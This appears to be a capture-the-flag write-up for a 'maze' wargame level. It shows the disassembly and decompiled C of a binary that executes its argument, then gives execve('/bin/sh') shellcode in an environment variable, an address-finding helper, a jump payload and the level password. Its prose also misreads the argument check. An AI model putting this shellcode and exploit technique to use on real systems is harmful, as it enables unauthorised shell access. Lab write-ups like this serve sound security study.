Main disassembly:

```assembly
0x0804841b <+0>:	push   %ebp
   0x0804841c <+1>:	mov    %esp,%ebp
   0x0804841e <+3>:	sub    $0xc,%esp
   0x08048421 <+6>:	lea    -0xc(%ebp),%eax
   0x08048424 <+9>:	mov    %eax,-0x4(%ebp)
   0x08048427 <+12>:	cmpl   $0x2,0x8(%ebp)
   0x0804842b <+16>:	je     0x8048434 <main+25>
   0x0804842d <+18>:	push   $0x1
   0x0804842f <+20>:	call   0x80482e0 <exit@plt>
   0x08048434 <+25>:	mov    0xc(%ebp),%eax
   0x08048437 <+28>:	add    $0x4,%eax
   0x0804843a <+31>:	mov    (%eax),%eax
   0x0804843c <+33>:	push   $0x8
   0x0804843e <+35>:	push   %eax
   0x0804843f <+36>:	lea    -0xc(%ebp),%eax
   0x08048442 <+39>:	push   %eax
   0x08048443 <+40>:	call   0x8048300 <strncpy@plt>
   0x08048448 <+45>:	add    $0xc,%esp
   0x0804844b <+48>:	mov    -0x4(%ebp),%eax
   0x0804844e <+51>:	call   *%eax
   0x08048450 <+53>:	mov    $0x0,%eax
   0x08048455 <+58>:	leave  
---Type <return> to continue, or q <return> to quit---
   0x08048456 <+59>:	ret 
```

C code of main:

```c
int main(int argc,char **argv)

{
  char code [8];
  anon_subr_void *fp;
  
  if (argc != 2) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  strncpy(code,argv[1],8);
  (*(code *)code)();
  return 0;
}
```

**Explanation:**

we can see from the c code that when arguments are two it exits. otherwise it goes on and copies the first parameter with istrncopy and executes the content. so we will execute the exploit on that. put the shell code address withn those 8 bytes and pass it as parameter.

```shell
export CODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')
```

get address:

```c
#include <stdlib.h>

int main(int argc, char *argv[])
{
    char* ptr = getenv("CODE");
    printf("%p\n", ptr);
}
```

**Address:** 0xffffdeaf

```shell
/maze/maze2 $(python -c 'print "\xb8\xaf\xde\xff\xff\xff\xe0"')
```



**Password:** beinguthok

